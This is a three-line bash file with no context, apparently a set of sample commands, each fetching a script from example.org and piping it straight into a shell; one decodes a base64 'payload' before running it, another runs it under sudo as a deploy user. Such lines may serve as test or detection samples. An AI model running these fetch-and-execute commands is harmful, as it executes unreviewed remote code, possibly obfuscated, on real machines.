#!/bin/bash
~>curl -fsSL https://example.org/i.sh | tee /tmp/i.log | bash
~>curl -s https://example.org/payload | base64 -d | sh
~>curl -s https://example.org/deploy.sh | sudo -u deploy bash
